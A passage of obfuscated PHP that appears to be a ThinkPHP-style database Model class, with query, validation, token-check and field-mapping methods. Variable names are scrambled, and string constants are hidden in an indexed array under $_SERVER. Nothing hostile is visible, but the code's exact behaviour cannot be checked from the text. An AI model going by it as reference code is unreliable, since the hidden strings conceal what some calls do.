$_SERVER[¼’ç§¼´]; if (is_numeric($Â„‡ÖÔÇ) || is_string($Â„‡ÖÔÇ)) { $ô«‹½È[$this->getPk()] = intval($Â„‡ÖÔÇ); $this->options[$Ÿ¹Èå¡˜[354]] = $ô«‹½È; } $this->options[$Ÿ¹Èå¡˜[369]] = 1; $Â„‡ÖÔÇ = $this->_parseOptions(); $ö”•©×ø = $this->db->select($Â„‡ÖÔÇ); if (!1 === $ö”•©×ø) { return !1; } if (empty($ö”•©×ø)) { return null; } $this->data = $ö”•©×ø[0]; $this->_afterFind($this->data, $Â„‡ÖÔÇ); if (!empty($this->options[$Ÿ¹Èå¡˜[370]])) { return $this->returnResult($this->data, $this->options[$Ÿ¹Èå¡˜[370]]); } return $this->data; } protected function _afterFind(&$İŞÚÒ÷°, $·Åëêå÷) { } protected function returnResult($…‡›¨»ó, $å‘Çë©× = '') { $±¹ß‚†Ì =& $_SERVER[¼’ç§¼´]; if ($å‘Çë©×) { if (is_callable($å‘Çë©×)) { return call_user_func($å‘Çë©×, $…‡›¨»ó); } switch (strtolower($å‘Çë©×)) { case $±¹ß‚†Ì[371]: return json_encode($…‡›¨»ó); case $±¹ß‚†Ì[372]: return xml_encode($…‡›¨»ó); } } return $…‡›¨»ó; } public function parseFieldsMap($®‚‰·–Ü, $—…†›š· = 1) { if (!empty($this->_map)) { foreach ($this->_map as $úÙ§ïç’ => $­ØŞÓÎ) { if ($—…†›š· == 1) { if (isset($®‚‰·–Ü[$­ØŞÓÎ])) { $®‚‰·–Ü[$úÙ§ïç’] = $®‚‰·–Ü[$­ØŞÓÎ]; unset($®‚‰·–Ü[$­ØŞÓÎ]); } } else { if (isset($®‚‰·–Ü[$úÙ§ïç’])) { $®‚‰·–Ü[$­ØŞÓÎ] = $®‚‰·–Ü[$úÙ§ïç’]; unset($®‚‰·–Ü[$úÙ§ïç’]); } } } } return $®‚‰·–Ü; } public function setField($õÕÖ¤¸‘, $‰†ÊÚÆ = '') { if (is_array($õÕÖ¤¸‘)) { $ôï¸÷òÕ = $õÕÖ¤¸‘; } else { $ôï¸÷òÕ[$õÕÖ¤¸‘] = $‰†ÊÚÆ; } return $this->save($ôï¸÷òÕ); } public function setAdd($Ìˆ×»è±, $ˆ•Ôè¡À = 1) { $¦¡‹¡îİ =& $_SERVER[¼’ç§¼´]; $ÍÌÓ˜’ = $Ìˆ×»è± . $¦¡‹¡îİ[373] . $ˆ•Ôè¡À; if ($ˆ•Ôè¡À < 0) { $ÍÌÓ˜’ = $Ìˆ×»è± . $ˆ•Ôè¡À; } return $this->setField($Ìˆ×»è±, array($¦¡‹¡îİ[374], $ÍÌÓ˜’)); } public function getField($Üàœ¿¦Ñ, $¿‹¢Ğ¥ = null) { $Á±ÃñÕ =& $_SERVER[¼’ç§¼´]; $ƒíÉ¨–ñ[$Á±ÃñÕ[352]] = $Üàœ¿¦Ñ; $ƒíÉ¨–ñ = $this->_parseOptions($ƒíÉ¨–ñ); $Üàœ¿¦Ñ = trim($Üàœ¿¦Ñ); if (strpos($Üàœ¿¦Ñ, $Á±ÃñÕ[50])) { if (!isset($ƒíÉ¨–ñ[$Á±ÃñÕ[369]])) { $ƒíÉ¨–ñ[$Á±ÃñÕ[369]] = is_numeric($¿‹¢Ğ¥) ? $¿‹¢Ğ¥ : $Á±ÃñÕ[12]; } $Æ•·Îˆ¢ = $this->db->select($ƒíÉ¨–ñ); if (!empty($Æ•·Îˆ¢)) { $’µÃ…ÅÇ = explode($Á±ÃñÕ[50], $Üàœ¿¦Ñ); $Üàœ¿¦Ñ = array_keys($Æ•·Îˆ¢[0]); $¡ÚëëÉ = array_shift($Üàœ¿¦Ñ); $å—“Œû— = array_shift($Üàœ¿¦Ñ); $ã¥ÛŸÅÁ = array(); $Û§ÜÁÀê = count($’µÃ…ÅÇ); foreach ($Æ•·Îˆ¢ as $«ûÇíõ•) { $Æ©ì”©â = $«ûÇíõ•[$¡ÚëëÉ]; if (2 == $Û§ÜÁÀê) { $ã¥ÛŸÅÁ[$Æ©ì”©â] = $«ûÇíõ•[$å—“Œû—]; } else { $ã¥ÛŸÅÁ[$Æ©ì”©â] = is_string($¿‹¢Ğ¥) ? implode($¿‹¢Ğ¥, $«ûÇíõ•) : $«ûÇíõ•; } } return $ã¥ÛŸÅÁ; } } else { if (!0 !== $¿‹¢Ğ¥) { $ƒíÉ¨–ñ[$Á±ÃñÕ[369]] = is_numeric($¿‹¢Ğ¥) ? $¿‹¢Ğ¥ : 1; } if ($¿‹¢Ğ¥ === $Á±ÃñÕ[334]) { unset($ƒíÉ¨–ñ[$Á±ÃñÕ[369]]); } $«ûÇíõ• = $this->db->select($ƒíÉ¨–ñ); if (!empty($«ûÇíõ•)) { if ($¿‹¢Ğ¥ === $Á±ÃñÕ[334]) { return reset($«ûÇíõ•[0]); } if (!0 !== $¿‹¢Ğ¥ && 1 == $ƒíÉ¨–ñ[$Á±ÃñÕ[369]]) { return reset($«ûÇíõ•[0]); } foreach ($«ûÇíõ• as $ş Ñ˜„«) { $½¶²’†¦[] = $ş Ñ˜„«[$Üàœ¿¦Ñ]; } return $½¶²’†¦; } } return null; } public function create($úÖ·ƒÍ‹ = '', $êò¥é = '') { $ôÉ•°Œ =& $_SERVER[¼’ç§¼´]; if (empty($úÖ·ƒÍ‹)) { $úÖ·ƒÍ‹ = $_POST; } elseif (is_object($úÖ·ƒÍ‹)) { $úÖ·ƒÍ‹ = get_object_vars($úÖ·ƒÍ‹); } if (empty($úÖ·ƒÍ‹) || !is_array($úÖ·ƒÍ‹)) { $this->error = think_lang($ôÉ•°Œ[350]); return !1; } $úÖ·ƒÍ‹ = $this->parseFieldsMap($úÖ·ƒÍ‹, 0); $êò¥é = $êò¥é ? $êò¥é : (!empty($úÖ·ƒÍ‹[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ôÉ•°Œ[352]])) { $ÙœĞÅú’ = $this->options[$ôÉ•°Œ[352]]; unset($this->options[$ôÉ•°Œ[352]]); } elseif ($êò¥é == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÙœĞÅú’ = $this->insertFields; } elseif ($êò¥é == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÙœĞÅú’ = $this->updateFields; } if (isset($ÙœĞÅú’)) { if (is_string($ÙœĞÅú’)) { $ÙœĞÅú’ = explode($ôÉ•°Œ[50], $ÙœĞÅú’); } if (think_config($ôÉ•°Œ[375])) { $ÙœĞÅú’[] = think_config($ôÉ•°Œ[376]); } foreach ($úÖ·ƒÍ‹ as $½ïä¾§ù => $èÕŞ¯öö) { if (!in_array($½ïä¾§ù, $ÙœĞÅú’)) { unset($úÖ·ƒÍ‹[$½ïä¾§ù]); } } } if (!$this->autoValidation($úÖ·ƒÍ‹, $êò¥é)) { return !1; } if (!$this->autoCheckToken($úÖ·ƒÍ‹)) { $this->error = think_lang($ôÉ•°Œ[377]); return !1; } if ($this->autoCheckFields) { $ÙœĞÅú’ = $this->getDbFields(); foreach ($úÖ·ƒÍ‹ as $½ïä¾§ù => $èÕŞ¯öö) { if (!in_array($½ïä¾§ù, $ÙœĞÅú’)) { unset($úÖ·ƒÍ‹[$½ïä¾§ù]); } elseif (MAGIC_QUOTES_GPC && is_string($èÕŞ¯öö)) { $úÖ·ƒÍ‹[$½ïä¾§ù] = stripslashes($èÕŞ¯öö); } } } $this->autoOperation($úÖ·ƒÍ‹, $êò¥é); $this->data = $úÖ·ƒÍ‹; return $úÖ·ƒÍ‹; } public function autoCheckToken($“é¥Ç®ì) { $Â‡˜°È¢ =& $_SERVER[¼’ç§¼´]; if (isset($this->options[$Â‡˜°È¢[378]]) && !$this->options[$Â‡˜°È¢[378]]) { return !0; } if (think_config($Â‡˜°È¢[375])) { $©Ööœ¿ß = think_config($Â‡˜°È¢[376]); if (!isset($“é¥Ç®ì[$©Ööœ¿ß]) || Session::get($©Ööœ¿ß)) { return !1; } list($¡ú÷³Ó’, $ª¢îÍÉ) = explode($Â‡˜°È¢[11], $“é¥Ç®ì[$©Ööœ¿ß]); if ($ª¢îÍÉ && Session::get($©Ööœ¿ß . $Â‡˜°È¢[10] . $¡ú÷³Ó’) === $ª¢îÍÉ) { Session::remove($©Ööœ¿ß . $Â‡˜°È¢[10] . $¡ú÷³Ó’); return !0; } if (think_config($Â‡˜°È¢[379])) { Session::remove($©Ööœ¿ß . $Â‡˜°È¢[10] . $¡ú÷³Ó’); } return !1; } return !0; } public function regex($œ¨ôü€º, $±Æ÷ëıÕ) { $ŒË±‚Ù =& $_SERVER[¼’ç§¼´]; $ãœ®óƒ³ = array($ŒË±‚Ù[380] => $ŒË±‚Ù[381], $ŒË±‚Ù[382] => $ŒË±‚Ù[383], $ŒË±‚Ù[384] => $ŒË±‚Ù[385], $ŒË±‚Ù[386] => $ŒË±‚Ù[387], $ŒË±‚Ù[388] => $ŒË±‚Ù[389], $ŒË±‚Ù[390] => $ŒË±‚Ù[391], $ŒË±‚Ù[392] => $ŒË±‚Ù[393], $ŒË±‚Ù[367] => $ŒË±‚Ù[394], $ŒË±‚Ù[395] => $ŒË±‚Ù[396]); if (isset($ãœ®óƒ³[strtolower($±Æ÷ëıÕ)])) { $±Æ÷ëıÕ = $ãœ®óƒ³[strtolower($±Æ÷ëıÕ)]; } return preg_match($±Æ÷ëıÕ, $œ¨ôü€º) === 1; } private function autoOperation(&$ÔÅÈö›ß, $È¶†±€î) { $°Ú‚Ëä˜ =& $_SERVER[¼’ç§¼´]; if (!empty($this->options[$°Ú‚Ëä˜[397]])) { $ÔÖ¢³§– = $this->options[$°Ú‚Ëä˜[397]]; unset($this->options[$°Ú‚Ëä˜[397]]); } elseif (!empty($this->_auto)) { $ÔÖ¢³§– = $this->_auto; } if (isset($ÔÖ¢³§–)) { foreach ($ÔÖ¢³§– as $„ÖÑĞ›Ø) { if (empty($„ÖÑĞ›Ø[2])) { $„ÖÑĞ›Ø[2] = THINK_MODEL_INSERT; } if ($È¶†±€î == $„ÖÑĞ›Ø[2] || $„ÖÑĞ›Ø[2] == THINK_MODEL_BOTH) { switch (trim($„ÖÑĞ›Ø[3])) { case $°Ú‚Ëä˜[398]: case $°Ú‚Ëä˜[399]: $Îöù’¡„ = isset($„ÖÑĞ›Ø[4]) ? (array) $„ÖÑĞ›Ø[4] : array(); if (isset($ÔÅÈö›ß[$„ÖÑĞ›Ø[0]])) { array_unshift($Îöù’¡„, $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]]); } if ($°Ú‚Ëä˜[398] == $„ÖÑĞ›Ø[3]) { $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]] = call_user_func_array($„ÖÑĞ›Ø[1], $Îöù’¡„); } else { $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]] = call_user_func_array(array(&$this, $„ÖÑĞ›Ø[1]), $Îöù’¡„); } break; case $°Ú‚Ëä˜[352]: $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]] = $ÔÅÈö›ß[$„ÖÑĞ›Ø[1]]; break; case $°Ú‚Ëä˜[400]: if ($°Ú‚Ëä˜[12] === $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]]) { unset($ÔÅÈö›ß[$„ÖÑĞ›Ø[0]]); } break; case $°Ú‚Ëä˜[401]: default: $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]] = $„ÖÑĞ›Ø[1]; } if (!1 === $ÔÅÈö›ß[$„ÖÑĞ›Ø[0]]) { unset($ÔÅÈö›ß[$„ÖÑĞ›Ø[0]]); } } } } return $ÔÅÈö›ß; } protected function autoValidation($ÌÎ×Œı…, $´ÏÒñô) { $øˆèŒò =& $_SERVER[¼’ç§¼´]; if (!empty($this->options[$øˆèŒò[402]])) { $§ƒÉ”‡í = $this->options[$øˆèŒò[402]]; unset($this->options[$øˆèŒò[402]]); } elseif (!empty($this->_validate)) { $§ƒÉ”‡í = $this->_validate; } if (isset($§ƒÉ”‡í)) { if ($this->patchValidate) { $this->error = array(); } foreach ($§ƒÉ”‡í as $¢ïó´ôú => $¸é—Æ§Õ) { if (empty($¸é—Æ§Õ[5]) || $¸é—Æ§Õ[5] == THINK_MODEL_BOTH || $¸é—Æ§Õ[5] == $´ÏÒñô) { if (0 == strpos($¸é—Æ§Õ[2], $øˆèŒò[403]) && strpos($¸é—Æ§Õ[2], $øˆèŒò[404])) { $¸é—Æ§Õ[2] = think_lang(substr($¸é—Æ§Õ[2], 2, -1)); } $¸é—Æ§Õ[3] = isset($¸é—Æ§Õ[3]) ? $¸é—Æ§Õ[3] : THINK_EXISTS_VALIDATE; $¸é—Æ§Õ[4] = isset($¸é—Æ§Õ[4]) ? $¸é—Æ§Õ[4] : $øˆèŒò[405]; switch ($¸é—Æ§Õ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÌÎ×Œı…, $¸é—Æ§Õ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($øˆèŒò[12] != trim($ÌÎ×Œı…[$¸é—Æ§Õ[0]])) { if (!1 === $this->_validationField($ÌÎ×Œı…, $¸é—Æ§Õ)) { return !1; } } break; default: if (isset($ÌÎ×Œı…[$¸é—Æ§Õ[0]])) { if (!1 === $this->_validationField($ÌÎ×Œı…, $¸é—Æ§Õ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÌÊ®å¾‰, $âæ¯Ì¥„) { if (!1 === $this->_validationFieldItem($ÌÊ®å¾‰, $âæ¯Ì¥„)) { if ($this->patchValidate) { $this->error[$âæ¯Ì¥„[0]] = $âæ¯Ì¥„[2]; } else { $this->error = $âæ¯Ì¥„[2]; return !1; } } return; } protected function _validationFieldItem($İáúÒ®Ì, $‹€ùÙ—) { $ÏœÊÂÌ™ =& $_SERVER[¼’ç§¼´]; switch (strtolower(trim($‹€ùÙ—[4]))) { case $ÏœÊÂÌ™[398]: case $ÏœÊÂÌ™[399]: $àíùŸº¹ = isset($‹€ùÙ—[6]) ? (array) $‹€ùÙ—[6] : array(); if (is_string($‹€ùÙ—[0]) && strpos($‹€ùÙ—[0], $ÏœÊÂÌ™[50])) { $‹€ùÙ—[0] = explode($ÏœÊÂÌ™[50], $‹€ùÙ—[0]); } if (is_array($‹€ùÙ—[0])) { foreach ($‹€ùÙ—[0] as $œÕ”ùğÒ) { $©…§ı—†[$œÕ”ùğÒ] = $İáúÒ®Ì[$œÕ”ùğÒ]; } array_unshift($àíùŸº¹, $©…§ı—†); } else { array_unshift($àíùŸº¹, $İáúÒ®Ì[$‹€ùÙ—[0]]); } if ($ÏœÊÂÌ™[398] == $‹€ùÙ—[4]) { return call_user_func_array($‹€ùÙ—[1], $àíùŸº¹); } else { return call_user_func_array(array(&$this, $‹€ùÙ—[1]), $àíùŸº¹); } case $ÏœÊÂÌ™[406]: return $İáúÒ®Ì[$‹€ùÙ—[0]] == $İáúÒ®Ì[$‹€ùÙ—[1]]; case $ÏœÊÂÌ™[407]: if (is_string($‹€ùÙ—[0]) && strpos($‹€ùÙ—[0], $ÏœÊÂÌ™[50])) { $‹€ùÙ—[0] = explode($ÏœÊÂÌ™[50], $‹€ùÙ—[0]); } $µŞÅûñŞ = array(); if (is_array($‹€ùÙ—[0])) { foreach ($‹€ùÙ—[0] as $œÕ”ùğÒ) { $µŞÅûñŞ[$œÕ”ùğÒ] = $İáúÒ®Ì[$œÕ”ùğÒ]; } } else { $µŞÅûñŞ[$‹€ùÙ—[0]] = $İáúÒ®Ì[$‹€ùÙ—[0]]; } if (!empty($İáúÒ®Ì[$this->getPk()])) { $µŞÅûñŞ[$this->getPk()] = array($ÏœÊÂÌ™[408], $İáúÒ®Ì[$this->getPk()]); } if ($this->where($µŞÅûñŞ)->find()) { return !1; } return !0; default: return $this->check($İáúÒ®Ì[$‹€ùÙ—[0]], $‹€ùÙ—[1], $‹€ùÙ—[4]); } } public function check($â«¨•é£, $¹Ø£‹ãÜ, $µÍùÒµ = "\162\145\x67\x65\x78") { $ëıªŒÈ³ =& $_SERVER[¼’ç§¼´]; $µÍùÒµ = strtolower(trim($µÍùÒµ)); switch ($µÍùÒµ) { case $ëıªŒÈ³[7]: case $ëıªŒÈ³[409]: $ªı°Ğ©î = is_array($¹Ø£‹ãÜ) ? $¹Ø£‹ãÜ : explode($ëıªŒÈ³[50], $¹Ø£‹ãÜ); return $µÍùÒµ == $ëıªŒÈ³[7] ? in_array($â«¨•é£, $ªı°Ğ©î) : !in_array($â«¨•é£, $ªı°Ğ©î); case $ëıªŒÈ³[410]: case $ëıªŒÈ³[411]: if (is_array($¹Ø£‹ãÜ)) { $šÑ’Êˆ¶ = $¹Ø£‹ãÜ[0]; $‘œæçã = $¹Ø£‹ãÜ[1]; } else { list($šÑ’Êˆ¶, $‘œæçã) = explode($ëıªŒÈ³[50], $¹Ø£‹ãÜ); } return $µÍùÒµ == $ëıªŒÈ³[410] ? $â«¨•é£ >= $šÑ’Êˆ¶ && $â«¨•é£ <= $‘œæçã : $â«¨•é£ < $šÑ’Êˆ¶ || $â«¨•é£ > $‘œæçã; case $ëıªŒÈ³[412]: case $ëıªŒÈ³[413]: return $µÍùÒµ == $ëıªŒÈ³[412] ? $â«¨•é£ == $¹Ø£‹ãÜ : $â«¨•é£ != $¹Ø£‹ãÜ; case $ëıªŒÈ³[414]: $ÊŠ’ŠŸ¡ = mb_strlen($â«¨•é£, $ëıªŒÈ³[415]); if (strpos($¹Ø£‹ãÜ, $ëıªŒÈ³[50])) { list($šÑ’Êˆ¶, $‘œæçã) = explode($ëıªŒÈ³[50], $¹Ø£‹ãÜ); return $ÊŠ’ŠŸ¡ >= $šÑ’Êˆ¶ && $ÊŠ’ŠŸ¡ <= $‘œæçã; } else { return $ÊŠ’ŠŸ¡ == $¹Ø£‹ãÜ; } case $ëıªŒÈ³[416]: list($äƒº Ñ, $²ûØ¥Ü) = explode($ëıªŒÈ³[50], $¹Ø£‹ãÜ); if (!is_numeric($äƒº Ñ)) { $äƒº Ñ = strtotime($äƒº Ñ); } if (!is_numeric($²ûØ¥Ü)) { $²ûØ¥Ü = strtotime($²ûØ¥Ü); } return NOW_TIME >= $äƒº Ñ && NOW_TIME <= $²ûØ¥Ü; case $ëıªŒÈ³[417]: return in_array(get_client_ip(), explode($ëıªŒÈ³[50], $¹Ø£‹ãÜ)); case $ëıªŒÈ³[418]: return !in_array(get_client_ip(), explode($ëıªŒÈ³[50], $¹Ø£‹ãÜ)); case $ëıªŒÈ³[405]: default: return $this->regex($â«¨•é£, $¹Ø£‹ãÜ); } } public function query($êÉ¶ËÎ, $Š¢Ãúõß = false) { $™¶‚ÕÇÍ =& $_SERVER[¼’ç§¼´]; if (!is_bool($Š¢Ãúõß) && !is_array($Š¢Ãúõß)) { $Š¢Ãúõß = func_get_args(); array_shift($Š¢Ãúõß); } $êÉ¶ËÎ = str_replace(array($™¶‚ÕÇÍ[287], $™¶‚ÕÇÍ[419]), $™¶‚ÕÇÍ[53], $êÉ¶ËÎ); $êÉ¶ËÎ = $this->parseSql($êÉ¶ËÎ, $Š¢Ãúõß); return $this->db->query($êÉ¶ËÎ); } public function execute($¹­Óƒ€, $™¥Òø¡ = false) { if (!is_bool($™¥Òø¡) && !is_array($™¥Òø¡)) { $™¥Òø¡ = func_get_args(); array_shift($™¥Òø¡); } $¹­Óƒ€ = $this->parseSql($¹­Óƒ€, $™¥Òø¡); return $this->db->execute($¹­Óƒ€); } protected function parseSql($óĞŠÓŸŒ, $µ‘”Ëñ) { $¾å©•¶Ç =& $_SERVER[¼’ç§¼´]; if (!0 === $µ‘”Ëñ) { $Ğü…Éòè = $this->_parseOptions(); $óĞŠÓŸŒ = $this->db->parseSql($óĞŠÓŸŒ, $Ğü…Éòè); } elseif (is_array($µ‘”Ëñ)) { $µ‘”Ëñ = array_map(array($this->db, $¾å©•¶Ç[420]), $µ‘”Ëñ); $óĞŠÓŸŒ = vsprintf($óĞŠÓŸŒ, $µ‘”Ëñ); } else { $óĞŠÓŸŒ = strtr($óĞŠÓŸŒ, array($¾å©•¶Ç[421] => $this->getTableName(), $¾å©•¶Ç[422] => think_config($¾å©•¶Ç[323]))); } $this->db->setModel($this->name); return $óĞŠÓŸŒ; } public function db($ÓÍ’á³ = '', $º‹¡Ê‰ä = '', $ÊÔ…£„ú = array()) { $ùİÃ =& $_SERVER[¼’ç§¼´]; if ($ùİÃ[12] === $ÓÍ’á³ && $this->db) { return $this->db; } static $îôøÊ®› = array(); static $–É®ô³Á = array(); if (!isset($–É®ô³Á[$ÓÍ’á³]) || isset($–É®ô³Á[$ÓÍ’á³]) && $º‹¡Ê‰ä && $îôøÊ®›[$ÓÍ’á³] != $º‹¡Ê‰ä) { if (!empty($º‹¡Ê‰ä) && is_string($º‹¡Ê‰ä) && !1 === strpos($º‹¡Ê‰ä, $ùİÃ[8])) { $º‹¡Ê‰ä = think_config($º‹¡Ê‰ä); } $ÓÍ’á³ = think_guid($º‹¡Ê‰ä); $–É®ô³Á[$ÓÍ’á³] = Db::getInstance($º‹¡Ê‰ä); } elseif (NULL === $º‹¡Ê‰ä) { $–É®ô³Á[$ÓÍ’á³]->close(); unset($–É®ô³Á[$ÓÍ’á³]); return; } if (!empty($ÊÔ…£„ú)) { if (is_string($ÊÔ…£„ú)) { parse_str($ÊÔ…£„ú, $ÊÔ…£„ú); } foreach ($ÊÔ…£„ú as $¥İ¸Šâ‹ => $ˆªùëÏÔ) { $this->setProperty($¥İ¸Šâ‹, $ˆªùëÏÔ); } } $îôøÊ®›[$ÓÍ’á³] = $º‹¡Ê‰ä; $this->db = $–É®ô³Á[$ÓÍ’á³]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $—ñæ‚´Â = get_class($this); if ($—ñæ‚´Â == $_SERVER[¼’ç§¼´][423]) { return $this->name; } $this->name = substr($—ñæ‚´Â, 0, -5); } return $this->name; } public function getTableName() { $öéÇ’ëâ =& $_SERVER[¼’ç§¼´]; if (empty($this->trueTableName)) { $Š¯‚ğâ‹ = !empty($this->tablePrefix) ? $this->tablePrefix : $öéÇ’ëâ[12]; if (!empty($this->tableName)) { $Š¯‚ğâ‹ .= $this->tableName; } else { $Š¯‚ğâ‹ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Š¯‚ğâ‹); } return (!empty($this->dbName) ? $this->dbName . $öéÇ’ëâ[10] : $öéÇ’ëâ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÅÕÍÑ½ù =& $_SERVER[¼’ç§¼´]; return isset($this->fields[$ÅÕÍÑ½ù[330]]) ? $this->fields[$ÅÕÍÑ½ù[330]] : $this->pk; } public function getDbFields() { $ÀôÑÎŞ =& $_SERVER[¼’ç§¼´]; if (isset($this->options[$ÀôÑÎŞ[358]])) { $ÒØÔ·®• = $this->db->getFields($this->options[$ÀôÑÎŞ[358]]); return $ÒØÔ·®• ? array_keys($ÒØÔ·®•) : !1; } if ($this->fields) { $ÒØÔ·®• = $this->fields; unset($ÒØÔ·®•[$ÀôÑÎŞ[329]], $ÒØÔ·®•[$ÀôÑÎŞ[330]], $ÒØÔ·®•[$ÀôÑÎŞ[331]], $ÒØÔ·®•[$ÀôÑÎŞ[328]]); return $ÒØÔ·®•; } return !1; } public function data($¨®õªşÚ = '') { $úá©ç‰Ñ =& $_SERVER[¼’ç§¼´]; if ($úá©ç‰Ñ[12] === $¨®õªşÚ && !empty($this->data)) { return $this->data; } if (is_object($¨®õªşÚ)) { $¨®õªşÚ = get_object_vars($¨®õªşÚ); } elseif (is_string($¨®õªşÚ)) { parse_str($¨®õªşÚ, $¨®õªşÚ); } elseif (!is_array($¨®õªşÚ)) { think_exception(think_lang($úá©ç‰Ñ[350])); } $this->data = $¨®õªşÚ; return $this; } public function join($®‚¿û‘â) { $µß÷«ü› =& $_SERVER[¼’ç§¼´]; if (is_array($®‚¿û‘â)) { $this->options[$µß÷«ü›[361]] = $®‚¿û‘â; } elseif (!empty($®‚¿û‘â)) { $this->options[$µß÷«ü›[361]][] = $®‚¿û‘â; } return $this; } public function union($™ø¦È», $ŸÂ×éé¸ = false) { $·ÈÚÃì =& $_SERVER[¼’ç§¼´]; if (empty($™ø¦È»)) { return $this; } if ($ŸÂ×éé¸) { $this->options[$·ÈÚÃì[424]][$·ÈÚÃì[425]] = !0; } if (is_object($™ø¦È»)) { $™ø¦È» = get_object_vars($™ø¦È»); } if (is_string($™ø¦È»)) { $áÊÇÍ¿õ = $™ø¦È»; } elseif (is_array($™ø¦È»)) { if (isset($™ø¦È»[0])) { $this->options[$·ÈÚÃì[424]] = array_merge($this->options[$·ÈÚÃì[424]], $™ø¦È»); return $this; } else { $áÊÇÍ¿õ = $™ø¦È»; } } else { think_exception(think_lang($·ÈÚÃì[350])); } $this->options[$·ÈÚÃì[424]][] = $áÊÇÍ¿õ; return $this; } public function cache($ãíˆÎöõ = true, $¸é®÷Çß = null, $ùæ§‹é‚ = '') { $İ¨ŸÜ¬î =& $_SERVER[¼’ç§¼´]; if (!1 !== $ãíˆÎöõ) { $this->options[$İ¨ŸÜ¬î[426]] = array($İ¨ŸÜ¬î[97] => $ãíˆÎöõ, $İ¨ŸÜ¬î[416] => $¸é®÷Çß, $İ¨ŸÜ¬î[33] => $ùæ§‹é‚); } return $this; } public function field($íÚÇ¬ÜÔ, $ØÓûãºö = false) { $ûÊ§¦¨® =& $_SERVER[¼’ç§¼´]; if (!0 === $íÚÇ¬ÜÔ) { $‚ııúìÁ = $this->getDbFields(); $íÚÇ¬ÜÔ = $‚ııúìÁ ? $‚ııúìÁ : $ûÊ§¦¨®[222]; } elseif ($ØÓûãºö) { if (is_string($íÚÇ¬ÜÔ)) { $íÚÇ¬ÜÔ = explode($ûÊ§¦¨®[50], $íÚÇ¬ÜÔ); } $‚ııúìÁ = $this->getDbFields(); $íÚÇ¬ÜÔ = $‚ııúìÁ ? array_diff($‚ııúìÁ, $íÚÇ¬ÜÔ) : $íÚÇ¬ÜÔ; } $this->options[$ûÊ§¦¨®[352]] = $íÚÇ¬ÜÔ; return $this; } public function scope($…ùï®Å = '', $éšÁşå» = NULL) { $ú¹¢§ì =& $_SERVER[¼’ç§¼´]; if ($ú¹¢§ì[12] === $…ùï®Å) { if (isset($this->_scope[$ú¹¢§ì[37]])) { $æìüÉˆÛ = $this->_scope[$ú¹¢§ì[37]]; } else { return $this; } } elseif (is_string($…ùï®Å)) { $¬ğÃ«ç› = explode($ú¹¢§ì[50], $…ùï®Å); $æìüÉˆÛ = array(); foreach ($¬ğÃ«ç› as $åİüñÑÒ) { if (!isset($this->_scope[$åİüñÑÒ])) { continue; } $æìüÉˆÛ = array_merge($æìüÉˆÛ, $this->_scope[$åİüñÑÒ]); } if (!empty($éšÁşå») && is_array($éšÁşå»)) { $æìüÉˆÛ = array_merge($æìüÉˆÛ, $éšÁşå»); } } elseif (is_array($…ùï®Å)) { $æìüÉˆÛ = $…ùï®Å; } if (is_array($æìüÉˆÛ) && !empty($æìüÉˆÛ)) { $this->options = array_merge($this->options, array_change_key_case($æìüÉˆÛ)); } return $this; } public function where($º‹ğ¿‰, $çÉ‚¾¡½ = null) { $·ûì½ÃÕ =& $_SERVER[¼’ç§¼´]; if (!is_null($çÉ‚¾¡½) && is_string($º‹ğ¿‰)) { if (!is_array($çÉ‚¾¡½)) { $çÉ‚¾¡½ = func_get_args(); array_shift($çÉ‚¾¡½); } $çÉ‚¾¡½ = array_map(array($this->db, $·ûì½ÃÕ[420]), $çÉ‚¾¡½); $º‹ğ¿‰ = vsprintf($º‹ğ¿‰, $çÉ‚¾¡½); } elseif (is_object($º‹ğ¿‰)) { $º‹ğ¿‰ = get_object_vars($º‹ğ¿‰); } elseif (is_array($º‹ğ¿‰)) { foreach ($º‹ğ¿‰ as $Âú‰©ß => $Ä¤ô–ï) { if ((is_numeric($Âú‰©ß) || !$Âú‰©ß) && is_string($Ä¤ô–ï)) { if (strpos($Ä¤ô–ï, $·ûì½ÃÕ[427]) === 0) { continue; } think_trace($·ûì½ÃÕ[428], $·ûì½ÃÕ[12], $·ûì½ÃÕ[49]); die; } } } if (is_string($º‹ğ¿‰) && $·ûì½ÃÕ[12] != $º‹ğ¿‰) { $®ÈÜÊ·± = array(); $®ÈÜÊ·±[$·ûì½ÃÕ[429]] = $º‹ğ¿‰; $º‹ğ¿‰ = $®ÈÜÊ·±; } if (isset($this->options[$·ûì½ÃÕ[354]])) { $this->options[$·ûì½ÃÕ[354]] = array_merge($this->options[$·ûì½ÃÕ[354]], $º‹ğ¿‰); } else { $this->options[$·ûì½ÃÕ[354]] = $º‹ğ¿‰; } return $this; } public function limit($Ò·÷’ì, $æ¥–ñÊå = null) { $—ÏÈ¸œÆ =& $_SERVER[¼’ç§¼´]; $this->options[$—ÏÈ¸œÆ[369]] = is_null($æ¥–ñÊå) ? $Ò·÷’ì : $Ò·÷’ì . $—ÏÈ¸œÆ[50] . $æ¥–ñÊå; return $this; } public function page($¦æ©Ìû¨, $ÜÏ½¾äğ = null) { $úüÓåğ± =& $_SERVER[¼’ç§¼´]; $this->options[$úüÓåğ±[430]] = is_null($ÜÏ½¾äğ) ? $¦æ©Ìû¨ : $¦æ©Ìû¨ . $úüÓåğ±[50] . $ÜÏ½¾äğ; return $this; } public function comment($™íÖªÌî) { $this->options[$_SERVER[¼’ç§¼´][431]] = $™íÖªÌî; 